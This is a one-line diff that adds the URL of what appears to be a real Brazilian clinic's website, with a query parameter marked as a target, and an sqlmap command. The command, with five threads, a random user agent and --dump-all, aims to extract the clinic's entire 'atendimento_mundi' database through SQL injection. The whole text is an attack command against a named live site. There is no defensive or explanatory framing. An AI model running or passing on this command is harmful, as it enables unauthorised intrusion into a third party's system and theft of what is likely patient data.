@@ -1,0 +1,1 @@
+http://www.clinicafabiomachado.com.br/interna.php?pagina=noticia.php&codigo=68 (GET)  # sqlmap.py -u http://www.clinicafabiomachado.com.br/interna.php?pagina=noticia.php&codigo=68 --threads 5 -v3 --random-agent -D atendimento_mundi --dump-all
